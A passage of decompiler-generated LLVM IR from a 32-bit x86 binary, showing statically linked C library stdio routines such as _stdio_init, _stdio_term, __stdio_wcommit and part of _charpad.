  %v3_8050bb3 = inttoptr i32 %v2_8050bb3 to i32*
  store i32 %v4_8050bab, i32* %v3_8050bb3, align 4
  %v2_8050bb6 = icmp slt i32 %v4_8050bab, 0
  br i1 %v2_8050bb6, label %dec_label_pc_8050ae5, label %dec_label_pc_8050bbe

dec_label_pc_8050bbe:                             ; preds = %dec_label_pc_8050ba3, %dec_label_pc_8050b93
  %v0_8050bbe = load i32, i32* @ebp, align 4
  %v1_8050bbe = inttoptr i32 %v0_8050bbe to i16*
  %v2_8050bbe = load i16, i16* %v1_8050bbe, align 2
  %v3_8050bbe = and i16 %v2_8050bbe, 8192
  store i16 %v3_8050bbe, i16* %v1_8050bbe, align 2
  %v0_8050bc4 = load i32, i32* @ebx, align 4
  %v8_8050bc6 = and i32 %v0_8050bc4, -31744
  %v1_8050bcb = urem i32 %v0_8050bc4, 4
  %v1_8050bce = add nuw nsw i32 %v1_8050bcb, 1
  store i32 %v1_8050bce, i32* %eax.global-to-local, align 4
  %v1_8050bcf = load i32, i32* @ebp, align 4
  %v2_8050bcf = inttoptr i32 %v1_8050bcf to i32*
  %v3_8050bcf = load i32, i32* %v2_8050bcf, align 4
  %v4_8050bcf = or i32 %v3_8050bcf, %v8_8050bc6
  %v1_8050bd2 = mul nuw nsw i32 %v1_8050bce, 16
  %v2_8050bd5 = xor i32 %v1_8050bd2, 48
  store i32 %v2_8050bd5, i32* %eax.global-to-local, align 4
  %v2_8050bd8 = or i32 %v4_8050bcf, %v2_8050bd5
  store i32 %v2_8050bd8, i32* @ebx, align 4
  %v1_8050bda = trunc i32 %v2_8050bd8 to i16
  %v3_8050bda = inttoptr i32 %v1_8050bcf to i16*
  store i16 %v1_8050bda, i16* %v3_8050bda, align 2
  %v0_8050bde = load i32, i32* %stack_var_-76, align 4
  %v1_8050bde = call i32 @__errno_location(i32 %v0_8050bde)
  store i32 %v1_8050bde, i32* %eax.global-to-local, align 4
  store i32 %v1_8050bde, i32* @esi, align 4
  %v1_8050be8 = inttoptr i32 %v1_8050bde to i32*
  %v2_8050be8 = load i32, i32* %v1_8050be8, align 4
  store i32 %v2_8050be8, i32* @edi, align 4
  %v0_8050bea = load i32, i32* @ebp, align 4
  %v1_8050bea = add i32 %v0_8050bea, 4
  %v2_8050bea = inttoptr i32 %v1_8050bea to i32*
  %v3_8050bea = load i32, i32* %v2_8050bea, align 4
  store i32 %v3_8050bea, i32* %stack_var_-76, align 4
  %v1_8050bed = call i32 @isatty(i32 %v3_8050bea)
  %v2_8050bf5 = mul i32 %v1_8050bed, 256
  store i32 %v2_8050bf5, i32* %eax.global-to-local, align 4
  %v0_8050bf8 = load i32, i32* @ebx, align 4
  %v2_8050bf8 = or i32 %v0_8050bf8, %v2_8050bf5
  store i32 %v2_8050bf8, i32* @ebx, align 4
  %v1_8050bfa = trunc i32 %v2_8050bf8 to i16
  %v2_8050bfa = load i32, i32* @ebp, align 4
  %v3_8050bfa = inttoptr i32 %v2_8050bfa to i16*
  store i16 %v1_8050bfa, i16* %v3_8050bfa, align 2
  %v0_8050bfe = load i32, i32* @edi, align 4
  %v1_8050bfe = load i32, i32* @esi, align 4
  %v2_8050bfe = inttoptr i32 %v1_8050bfe to i32*
  store i32 %v0_8050bfe, i32* %v2_8050bfe, align 4
  %v0_8050c00 = load i32, i32* @ebp, align 4
  %v1_8050c00 = add i32 %v0_8050c00, 8
  %v2_8050c00 = inttoptr i32 %v1_8050c00 to i32*
  %v3_8050c00 = load i32, i32* %v2_8050c00, align 4
  %v4_8050c00 = icmp eq i32 %v3_8050c00, 0
  %v1_8050c04 = icmp eq i1 %v4_8050c00, false
  br i1 %v1_8050c04, label %dec_label_pc_8050c34, label %dec_label_pc_8050c06

dec_label_pc_8050c06:                             ; preds = %dec_label_pc_8050bbe
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_8050c0e = call i32 @malloc(i32 4096)
  store i32 %v1_8050c0e, i32* %eax.global-to-local, align 4
  %v1_8050c16 = load i32, i32* @ebp, align 4
  %v2_8050c16 = add i32 %v1_8050c16, 8
  %v3_8050c16 = inttoptr i32 %v2_8050c16 to i32*
  store i32 %v1_8050c0e, i32* %v3_8050c16, align 4
  %v1_8050c19 = icmp eq i32 %v1_8050c0e, 0
  %v0_8050c2d = load i32, i32* @ebp, align 4
  br i1 %v1_8050c19, label %dec_label_pc_8050c2d, label %dec_label_pc_8050c1d

dec_label_pc_8050c1d:                             ; preds = %dec_label_pc_8050c06
  %v1_8050c1d = inttoptr i32 %v0_8050c2d to i16*
  %v2_8050c1d = load i16, i16* %v1_8050c1d, align 2
  %v3_8050c1d = or i16 %v2_8050c1d, 16384
  store i16 %v3_8050c1d, i16* %v1_8050c1d, align 2
  %v1_8050c23 = add i32 %v1_8050c0e, 4096
  store i32 %v1_8050c23, i32* %eax.global-to-local, align 4
  %v1_8050c28 = load i32, i32* @ebp, align 4
  %v2_8050c28 = add i32 %v1_8050c28, 12
  %v3_8050c28 = inttoptr i32 %v2_8050c28 to i32*
  store i32 %v1_8050c23, i32* %v3_8050c28, align 4
  br label %dec_label_pc_8050c34

dec_label_pc_8050c2d:                             ; preds = %dec_label_pc_8050c06
  %v1_8050c2d = add i32 %v0_8050c2d, 12
  %v2_8050c2d = inttoptr i32 %v1_8050c2d to i32*
  store i32 0, i32* %v2_8050c2d, align 4
  br label %dec_label_pc_8050c34

dec_label_pc_8050c34:                             ; preds = %dec_label_pc_8050bbe, %dec_label_pc_8050c1d, %dec_label_pc_8050c2d
  %v0_8050c34 = load i32, i32* @ebp, align 4
  %v1_8050c34 = add i32 %v0_8050c34, 8
  %v2_8050c34 = inttoptr i32 %v1_8050c34 to i32*
  %v3_8050c34 = load i32, i32* %v2_8050c34, align 4
  store i32 %v3_8050c34, i32* %eax.global-to-local, align 4
  %v1_8050c37 = add i32 %v0_8050c34, 2
  %v2_8050c37 = inttoptr i32 %v1_8050c37 to i8*
  store i8 0, i8* %v2_8050c37, align 1
  %v0_8050c3b = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c3b = load i32, i32* @ebp, align 4
  %v2_8050c3b = add i32 %v1_8050c3b, 24
  %v3_8050c3b = inttoptr i32 %v2_8050c3b to i32*
  store i32 %v0_8050c3b, i32* %v3_8050c3b, align 4
  %v0_8050c3e = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c3e = load i32, i32* @ebp, align 4
  %v2_8050c3e = add i32 %v1_8050c3e, 28
  %v3_8050c3e = inttoptr i32 %v2_8050c3e to i32*
  store i32 %v0_8050c3e, i32* %v3_8050c3e, align 4
  %v0_8050c41 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c41 = load i32, i32* @ebp, align 4
  %v2_8050c41 = add i32 %v1_8050c41, 16
  %v3_8050c41 = inttoptr i32 %v2_8050c41 to i32*
  store i32 %v0_8050c41, i32* %v3_8050c41, align 4
  %v0_8050c44 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c44 = load i32, i32* @ebp, align 4
  %v2_8050c44 = add i32 %v1_8050c44, 20
  %v3_8050c44 = inttoptr i32 %v2_8050c44 to i32*
  store i32 %v0_8050c44, i32* %v3_8050c44, align 4
  %v0_8050c47 = load i32, i32* @ebp, align 4
  %v1_8050c47 = add i32 %v0_8050c47, 44
  %v2_8050c47 = inttoptr i32 %v1_8050c47 to i32*
  store i32 0, i32* %v2_8050c47, align 4
  %v0_8050c4e = load i32, i32* @ebp, align 4
  %v1_8050c4e = add i32 %v0_8050c4e, 1
  %v2_8050c4e = inttoptr i32 %v1_8050c4e to i8*
  %v3_8050c4e = load i8, i8* %v2_8050c4e, align 1
  %v4_8050c4e = and i8 %v3_8050c4e, 32
  %v5_8050c4e = icmp eq i8 %v4_8050c4e, 0
  %v0_8050c52 = load i32, i32* @global_var_805b2ec.467, align 4
  store i32 %v0_8050c52, i32* @eax, align 4
  %v2_8050c57 = add i32 %v0_8050c4e, 52
  %v3_8050c57 = inttoptr i32 %v2_8050c57 to i32*
  store i32 %v0_8050c52, i32* %v3_8050c57, align 4
  br i1 %v5_8050c4e, label %dec_label_pc_8050cc9, label %dec_label_pc_8050c5c

dec_label_pc_8050c5c:                             ; preds = %dec_label_pc_8050c34
  %v2_8050c67 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050c67, i32* %stack_var_-76, align 4
  %v2_8050c6c = call i32 @__pthread_return_void(i32 %v2_8050c67, i32 134562611)
  store i32 %v2_8050c6c, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805b2d4.464 to i32), i32* %stack_var_-76, align 4
  %v1_8050c78 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2d4.464 to i32))
  store i32 %v1_8050c78, i32* @eax, align 4
  %v2_8050c8a = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8050c8a, i32* %stack_var_-76, align 4
  %v2_8050c8f = call i32 @__pthread_return_void(i32 %v2_8050c8a, i32 134562611)
  store i32 %v2_8050c8f, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805b2bc.468 to i32), i32* %stack_var_-76, align 4
  %v1_8050c9b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2bc.468 to i32))
  %v0_8050ca0 = load i32, i32* bitcast (i32** @global_var_805b2b8.469 to i32*), align 8
  store i32 %v0_8050ca0, i32* @eax, align 4
  %v1_8050ca5 = load i32, i32* @ebp, align 4
  %v2_8050ca5 = add i32 %v1_8050ca5, 32
  %v3_8050ca5 = inttoptr i32 %v2_8050ca5 to i32*
  store i32 %v0_8050ca0, i32* %v3_8050ca5, align 4
  %v0_8050ca8 = load i32, i32* @ebp, align 4
  store i32 %v0_8050ca8, i32* bitcast (i32** @global_var_805b2b8.469 to i32*), align 8
  %v2_8050cae = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_8050cae, i32* @ecx, align 4
  store i32 %v2_8050c8a, i32* %stack_var_-76, align 4
  %v2_8050cb3 = call i32 @__pthread_return_void(i32 %v2_8050c8a, i32 1)
  store i32 %v2_8050c8a, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_8050c67, i32* %stack_var_-76, align 4
  %v2_8050cbd = call i32 @__pthread_return_void(i32 %v2_8050c67, i32 1)
  store i32 %v2_8050cbd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050cc2

dec_label_pc_8050cc2:                             ; preds = %dec_label_pc_8050aef, %dec_label_pc_8050c5c
  br label %dec_label_pc_8050cc9

dec_label_pc_8050cc7:                             ; preds = %dec_label_pc_8050ae5, %dec_label_pc_8050ad2
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8050cc9

dec_label_pc_8050cc9:                             ; preds = %dec_label_pc_8050c34, %dec_label_pc_8050b1e, %dec_label_pc_8050cc2, %dec_label_pc_8050cc7
  %v0_8050ccc = load i32, i32* @ebp, align 4
  store i32 %v0_8050ccc, i32* %eax.global-to-local, align 4
  %v2_8050cce = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050cce, i32* @ebx, align 4
  store i32 %v0_8050aa6, i32* @esi, align 4
  store i32 %v0_8050aa5, i32* @edi, align 4
  store i32 %v0_8050aa4, i32* @ebp, align 4
  ret i32 %v0_8050ccc

; uselistorder directives
  uselistorder i32 %v2_8050c8a, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_8050c67, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8050c2d, { 1, 0 }
  uselistorder i32 %v1_8050c0e, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8050bf5, { 1, 0 }
  uselistorder i32 %v1_8050bde, { 1, 0, 2 }
  uselistorder i32 %v11_8050ba0, { 1, 0 }
  uselistorder i32 %v0_8050ba9.pre, { 1, 0 }
  uselistorder i32 %v1_8050b71, { 1, 0 }
  uselistorder i32 %v0_8050b6d, { 1, 0 }
  uselistorder i32 %v1_8050b62, { 1, 0, 2 }
  uselistorder i32 %v1_8050b23, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_8050b12, { 1, 0 }
  uselistorder i32 %v0_8050ae5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_8050cc9, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8050cc2, { 1, 0 }
  uselistorder label %dec_label_pc_8050c34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050ba3, { 1, 0 }
  uselistorder label %dec_label_pc_8050b93, { 1, 0 }
  uselistorder label %dec_label_pc_8050b50, { 1, 0 }
  uselistorder label %dec_label_pc_8050b1a, { 1, 0 }
  uselistorder label %dec_label_pc_8050b0c, { 1, 0 }
  uselistorder label %dec_label_pc_8050b01, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050cd5 = load i32, i32* @edi, align 4
  %v0_8050cd6 = load i32, i32* @esi, align 4
  %v0_8050cd7 = load i32, i32* @ebx, align 4
  store i32 %v0_8050cd7, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_8050ce0 = call i32 @__errno_location(i32 %v0_8050cd7)
  store i32 %v1_8050ce0, i32* @edi, align 4
  %v0_8050cea = load i32, i32* @global_var_805b300.460, align 256
  store i32 %v0_8050cea, i32* @esi, align 4
  %v1_8050cf0 = inttoptr i32 %v1_8050ce0 to i32*
  %v2_8050cf0 = load i32, i32* %v1_8050cf0, align 4
  store i32 %v2_8050cf0, i32* %ebp.global-to-local, align 4
  %v1_8050cf4 = call i32 @isatty(i32 0)
  %v0_8050cf9 = load i32, i32* @ebx, align 4
  %v2_8050cfb = sub i32 %v0_8050cf9, %v1_8050cf4
  %v2_8050d06 = mul i32 %v2_8050cfb, 256
  %v0_8050d09 = load i32, i32* @esi, align 4
  %v2_8050d09 = xor i32 %v0_8050d09, %v2_8050d06
  %v1_8050d0b = trunc i32 %v2_8050d09 to i16
  store i16 %v1_8050d0b, i16* bitcast (i32* @global_var_805b300.460 to i16*), align 256
  %v0_8050d12 = load i32, i32* @global_var_805b350.461, align 16
  store i32 %v0_8050d12, i32* @esi, align 4
  %v1_8050d18 = call i32 @isatty(i32 1)
  %v0_8050d1d = load i32, i32* @ebx, align 4
  %v2_8050d1d = sub i32 %v0_8050d1d, %v1_8050d18
  %v2_8050d1f = mul i32 %v2_8050d1d, 256
  %v0_8050d22 = load i32, i32* @esi, align 4
  %v2_8050d22 = xor i32 %v2_8050d1f, %v0_8050d22
  %v1_8050d24 = trunc i32 %v2_8050d22 to i16
  store i16 %v1_8050d24, i16* bitcast (i32* @global_var_805b350.461 to i16*), align 16
  %v0_8050d2b = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050d2b = load i32, i32* @edi, align 4
  %v2_8050d2b = inttoptr i32 %v1_8050d2b to i32*
  store i32 %v0_8050d2b, i32* %v2_8050d2b, align 4
  %v2_8050d30 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050d30, i32* @ebx, align 4
  store i32 %v0_8050cd6, i32* @esi, align 4
  store i32 %v0_8050cd5, i32* @edi, align 4
  ret i32 %v1_8050d18

; uselistorder directives
  uselistorder i32 %v1_8050ce0, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8050d43 = inttoptr i32 %arg1 to i16*
  %v4_8050d43 = call i32 @memcpy(i16* %v3_8050d43, i32 ptrtoint (i32* @global_var_80592e0.470 to i32), i32 24)
  ret i32 %v4_8050d43
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8050d4c = load i32, i32* @esi, align 4
  %v0_8050d4d = load i32, i32* @ebx, align 4
  store i32 %v0_8050d4d, i32* %stack_var_-8, align 4
  %v1_8050d56 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805b2bc.468 to i32))
  store i32 %v1_8050d56, i32* %eax.global-to-local, align 4
  %v1_8050d62 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805b2d4.464 to i32))
  store i32 %v1_8050d62, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_805b2b8.469 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_8050dac22 = icmp eq i32 %storemerge21, 0
  %v1_8050dae23 = icmp eq i1 %v1_8050dac22, false
  br i1 %v1_8050dae23, label %dec_label_pc_8050d6f.lr.ph, label %dec_label_pc_8050dcc.preheader

dec_label_pc_8050d6f.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8050d6f

dec_label_pc_8050d6f:                             ; preds = %dec_label_pc_8050d6f.lr.ph, %dec_label_pc_8050d96
  %storemerge24 = phi i32 [ %storemerge21, %dec_label_pc_8050d6f.lr.ph ], [ %storemerge, %dec_label_pc_8050d96 ]
  %v1_8050d72 = add i32 %storemerge24, 56
  store i32 %v1_8050d72, i32* @esi, align 4
  %v1_8050d76 = call i32 @__pthread_return_0(i32 %v1_8050d72)
  store i32 %v1_8050d76, i32* %eax.global-to-local, align 4
  %v1_8050d7e = icmp eq i32 %v1_8050d76, 0
  br i1 %v1_8050d7e, label %dec_label_pc_8050d96, label %dec_label_pc_8050d82

dec_label_pc_8050d82:                             ; preds = %dec_label_pc_8050d6f
  %v0_8050d82 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050d82 = add i32 %v0_8050d82, 8
  %v2_8050d82 = inttoptr i32 %v1_8050d82 to i32*
  %v3_8050d82 = load i32, i32* %v2_8050d82, align 4
  store i32 %v3_8050d82, i32* %eax.global-to-local, align 4
  %v1_8050d85 = inttoptr i32 %v0_8050d82 to i16*
  store i16 48, i16* %v1_8050d85, align 2
  %v0_8050d8a = load i32, i32* %eax.global-to-local, align 4
  %v1_8050d8a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050d8a = add i32 %v1_8050d8a, 24
  %v3_8050d8a = inttoptr i32 %v2_8050d8a to i32*
  store i32 %v0_8050d8a, i32* %v3_8050d8a, align 4
  %v0_8050d8d = load i32, i32* %eax.global-to-local, align 4
  %v1_8050d8d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050d8d = add i32 %v1_8050d8d, 28
  %v3_8050d8d = inttoptr i32 %v2_8050d8d to i32*
  store i32 %v0_8050d8d, i32* %v3_8050d8d, align 4
  %v0_8050d90 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050d90 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050d90 = add i32 %v1_8050d90, 16
  %v3_8050d90 = inttoptr i32 %v2_8050d90 to i32*
  store i32 %v0_8050d90, i32* %v3_8050d90, align 4
  %v0_8050d93 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050d93 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050d93 = add i32 %v1_8050d93, 20
  %v3_8050d93 = inttoptr i32 %v2_8050d93 to i32*
  store i32 %v0_8050d93, i32* %v3_8050d93, align 4
  br label %dec_label_pc_8050d96

dec_label_pc_8050d96:                             ; preds = %dec_label_pc_8050d6f, %dec_label_pc_8050d82
  %v0_8050d99 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050d99 = add i32 %v0_8050d99, 52
  %v2_8050d99 = inttoptr i32 %v1_8050d99 to i32*
  store i32 1, i32* %v2_8050d99, align 4
  %v0_8050da0 = load i32, i32* @esi, align 4
  %v1_8050da1 = call i32 @__stdio_init_mutex(i32 %v0_8050da0)
  store i32 %v1_8050da1, i32* %eax.global-to-local, align 4
  %v0_8050da6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050da6 = add i32 %v0_8050da6, 32
  %v2_8050da6 = inttoptr i32 %v1_8050da6 to i32*
  %storemerge = load i32, i32* %v2_8050da6, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_8050dac = icmp eq i32 %storemerge, 0
  %v1_8050dae = icmp eq i1 %v1_8050dac, false
  br i1 %v1_8050dae, label %dec_label_pc_8050d6f, label %dec_label_pc_8050da9.dec_label_pc_8050dcc.preheader_crit_edge

dec_label_pc_8050da9.dec_label_pc_8050dcc.preheader_crit_edge: ; preds = %dec_label_pc_8050d96
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_805b2b8.469 to i32*), align 4
  br label %dec_label_pc_8050dcc.preheader

dec_label_pc_8050dcc.preheader:                   ; preds = %dec_label_pc_8050da9.dec_label_pc_8050dcc.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_8050da9.dec_label_pc_8050dcc.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_8050dcc3 = icmp eq i32 %storemerge12, 0
  %v1_8050dce10 = icmp eq i1 %v1_8050dcc3, false
  br i1 %v1_8050dce10, label %dec_label_pc_8050db8.preheader, label %dec_label_pc_8050dd0

dec_label_pc_8050db8.preheader:                   ; preds = %dec_label_pc_8050dcc.preheader
  br label %dec_label_pc_8050db8

dec_label_pc_8050db8:                             ; preds = %dec_label_pc_8050db8.preheader, %dec_label_pc_8050dc9
  %v0_8050dc0 = phi i32 [ %storemerge1, %dec_label_pc_8050dc9 ], [ %storemerge12, %dec_label_pc_8050db8.preheader ]
  %v1_8050db8 = inttoptr i32 %v0_8050dc0 to i8*
  %v2_8050db8 = load i8, i8* %v1_8050db8, align 1
  %v3_8050db8 = and i8 %v2_8050db8, 64
  %v4_8050db8 = icmp eq i8 %v3_8050db8, 0
  br i1 %v4_8050db8, label %dec_label_pc_8050dc9, label %dec_label_pc_8050dbd

dec_label_pc_8050dbd:                             ; preds = %dec_label_pc_8050db8
  %v1_8050dc1 = call i32 @__stdio_wcommit(i32 %v0_8050dc0)
  store i32 %v1_8050dc1, i32* %eax.global-to-local, align 4
  %v0_8050dc9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050dc9

dec_label_pc_8050dc9:                             ; preds = %dec_label_pc_8050db8, %dec_label_pc_8050dbd
  %v0_8050dc9 = phi i32 [ %v0_8050dc0, %dec_label_pc_8050db8 ], [ %v0_8050dc9.pre, %dec_label_pc_8050dbd ]
  %v1_8050dc9 = add i32 %v0_8050dc9, 32
  %v2_8050dc9 = inttoptr i32 %v1_8050dc9 to i32*
  %storemerge1 = load i32, i32* %v2_8050dc9, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_8050dcc = icmp eq i32 %storemerge1, 0
  %v1_8050dce = icmp eq i1 %v1_8050dcc, false
  br i1 %v1_8050dce, label %dec_label_pc_8050db8, label %dec_label_pc_8050dd0

dec_label_pc_8050dd0:                             ; preds = %dec_label_pc_8050dc9, %dec_label_pc_8050dcc.preheader
  %v2_8050dd0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050dd0, i32* %eax.global-to-local, align 4
  %v2_8050dd1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050dd1, i32* @ebx, align 4
  store i32 %v0_8050d4c, i32* @esi, align 4
  ret i32 %v2_8050dd0

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_8050dc9, { 1, 0 }
  uselistorder label %dec_label_pc_8050db8, { 1, 0 }
  uselistorder label %dec_label_pc_8050d96, { 1, 0 }
  uselistorder label %dec_label_pc_8050d6f, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_8050dd4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8050ddc = add i32 %arg1, 8
  %v2_8050ddc = inttoptr i32 %v1_8050ddc to i32*
  %v3_8050ddc = load i32, i32* %v2_8050ddc, align 4
  store i32 %v3_8050ddc, i32* %edx.global-to-local, align 4
  %v1_8050ddf = add i32 %arg1, 16
  %v2_8050ddf = inttoptr i32 %v1_8050ddf to i32*
  %v3_8050ddf = load i32, i32* %v2_8050ddf, align 4
  %v2_8050de2 = sub i32 %v3_8050ddf, %v3_8050ddc
  %v12_8050de2 = icmp eq i32 %v2_8050de2, 0
  store i32 %v2_8050de2, i32* %eax.global-to-local, align 4
  br i1 %v12_8050de2, label %dec_label_pc_8050df5, label %dec_label_pc_8050de6

dec_label_pc_8050de6:                             ; preds = %entry
  store i32 %v3_8050ddc, i32* %v2_8050ddf, align 4
  %v0_8050de9 = load i32, i32* @ecx, align 4
  %v0_8050dea = load i32, i32* %eax.global-to-local, align 4
  %v0_8050deb = load i32, i32* %edx.global-to-local, align 4
  %v0_8050dec = load i32, i32* @ebx, align 4
  %v4_8050ded = inttoptr i32 %v0_8050dec to i16*
  %v5_8050ded = call i32 @__stdio_WRITE(i16* %v4_8050ded, i32 %v0_8050deb, i32 %v0_8050dea, i32 %v0_8050de9)
  store i32 %v5_8050ded, i32* %eax.global-to-local, align 4
  %v0_8050df5.pre = load i32, i32* @ebx, align 4
  %v2_8050dfb.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8050df5

dec_label_pc_8050df5:                             ; preds = %entry, %dec_label_pc_8050de6
  %v2_8050dfb = phi i32 [ %tmp11, %entry ], [ %v2_8050dfb.pre, %dec_label_pc_8050de6 ]
  %v0_8050df5 = phi i32 [ %arg1, %entry ], [ %v0_8050df5.pre, %dec_label_pc_8050de6 ]
  %v1_8050df5 = add i32 %v0_8050df5, 16
  %v2_8050df5 = inttoptr i32 %v1_8050df5 to i32*
  %v3_8050df5 = load i32, i32* %v2_8050df5, align 4
  store i32 %v3_8050df5, i32* %eax.global-to-local, align 4
  %v2_8050df8 = add i32 %v0_8050df5, 8
  %v3_8050df8 = inttoptr i32 %v2_8050df8 to i32*
  %v4_8050df8 = load i32, i32* %v3_8050df8, align 4
  %v5_8050df8 = sub i32 %v3_8050df5, %v4_8050df8
  store i32 %v5_8050df8, i32* %eax.global-to-local, align 4
  store i32 %v2_8050dfb, i32* @edx, align 4
  store i32 %v0_8050dd4, i32* @ebx, align 4
  ret i32 %v5_8050df8

; uselistorder directives
  uselistorder i32 %v0_8050df5, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8050df5, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_8050e00 = load i32, i32* @edi, align 4
  %v0_8050e01 = load i32, i32* @esi, align 4
  %v0_8050e02 = load i32, i32* @ebx, align 4
  %v0_8050e03 = load i32, i32* @eax, align 4
  store i32 %v0_8050e03, i32* @edi, align 4
  %v0_8050e08 = load i32, i32* @ecx, align 4
  store i32 %v0_8050e08, i32* @esi, align 4
  store i32 %v0_8050e08, i32* @ebx, align 4
  %v0_8050e0c = load i32, i32* @edx, align 4
  store i32 %v0_8050e0c, i32* %stack_var_-13, align 4
  %v1_8050e132 = icmp eq i32 %v0_8050e08, 0
  br i1 %v1_8050e132, label %dec_label_pc_8050e2b, label %dec_label_pc_8050e17.lr.ph

dec_label_pc_8050e17.lr.ph:                       ; preds = %entry
  %v2_8050e17 = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_8050e17

dec_label_pc_8050e12:                             ; preds = %dec_label_pc_8050e17
  %v1_8050e12 = add i32 %v0_8050e12, -1
  %v8_8050e12 = icmp eq i32 %v1_8050e12, 0
  store i32 %v1_8050e12, i32* @ebx, align 4
  br i1 %v8_8050e12, label %dec_label_pc_8050e2b.loopexit, label %dec_label_pc_8050e12.dec_label_pc_8050e17_crit_edge

dec_label_pc_8050e12.dec_label_pc_8050e17_crit_edge: ; preds = %dec_label_pc_8050e12
  %v0_8050e1b.pre = load i32, i32* @edx, align 4
  %v0_8050e1c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050e17

dec_label_pc_8050e17:                             ; preds = %dec_label_pc_8050e12.dec_label_pc_8050e17_crit_edge, %dec_label_pc_8050e17.lr.ph
  %v0_8050e1c = phi i32 [ %v0_8050e1c.pre, %dec_label_pc_8050e12.dec_label_pc_8050e17_crit_edge ], [ %v0_8050e03, %dec_label_pc_8050e17.lr.ph ]
  %v0_8050e1b = phi i32 [ %v0_8050e1b.pre, %dec_label_pc_8050e12.dec_label_pc_8050e17_crit_edge ], [ %v0_8050e0c, %dec_label_pc_8050e17.lr.ph ]
  %v4_8050e20 = call i32 @__stdio_fwrite(i32 %v2_8050e17, i32 1, i32 %v0_8050e1c, i32 %v0_8050e1b)
  %v8_8050e28 = icmp eq i32 %v4_8050e20, 1
  %v0_8050e12 = load i32, i32* @ebx, align 4
